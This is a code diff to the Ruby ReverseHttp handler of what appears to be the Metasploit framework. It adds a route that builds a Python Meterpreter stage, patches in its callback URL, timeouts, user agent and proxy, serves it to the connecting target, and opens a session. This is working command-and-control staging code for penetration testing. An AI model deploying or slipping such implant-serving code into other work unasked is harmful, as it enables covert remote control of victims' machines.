@@ -138,7 +138,7 @@ module ReverseHttp
         'MsfExploit' => self,
       },
       comm,
-      (ssl?) ? datastore["SSLCert"] : nil
+      (ssl?) ? datastore["HandlerSSLCert"] : nil
     )
 
     self.service.server_name = datastore['MeterpreterServerName']
@@ -194,6 +194,40 @@ protected
 
     # Process the requested resource.
     case uri_match
+      when /^\/INITPY/
+        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
+        url = payload_uri + conn_id + '/'
+
+        blob = ""
+        blob << obj.generate_stage
+
+        var_escape = lambda { |txt|
+          txt.gsub('\\', '\\'*8).gsub('\'', %q(\\\\\\\'))
+        }
+
+        # Patch all the things
+        blob.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(url)}'")
+        blob.sub!('HTTP_EXPIRATION_TIMEOUT = 604800', "HTTP_EXPIRATION_TIMEOUT = #{datastore['SessionExpirationTimeout']}")
+        blob.sub!('HTTP_COMMUNICATION_TIMEOUT = 300', "HTTP_COMMUNICATION_TIMEOUT = #{datastore['SessionCommunicationTimeout']}")
+        blob.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(datastore['MeterpreterUserAgent'])}'")
+
+        unless datastore['PROXYHOST'].blank?
+          proxy_url = "http://#{datastore['PROXYHOST']}:#{datastore['PROXYPORT']}"
+          blob.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(proxy_url)}'")
+        end
+
+        resp.body = blob
+
+        # Short-circuit the payload's handle_connection processing for create_session
+        create_session(cli, {
+          :passive_dispatcher => obj.service,
+          :conn_id            => conn_id,
+          :url                => url,
+          :expiration         => datastore['SessionExpirationTimeout'].to_i,
+          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
+          :ssl                => ssl?,
+        })
+
       when /^\/INITJM/
         conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
         url = payload_uri + conn_id + "/\x00"
@@ -201,7 +235,7 @@ protected
         blob = ""
         blob << obj.generate_stage
 
-        # This is a TLV packet - I guess somewhere there should be API for building them
+        # This is a TLV packet - I guess somewhere there should be an API for building them
         # in Metasploit :-)
         packet = ""
         packet << ["core_switch_url\x00".length + 8, 0x10001].pack('NN') + "core_switch_url\x00"
@@ -223,7 +257,6 @@ protected
         })
 
       when /^\/A?INITM?/
-
         url = ''
 
         print_status("#{cli.peerhost}:#{cli.peerport} Staging connection for target #{req.relative_resource} received...")
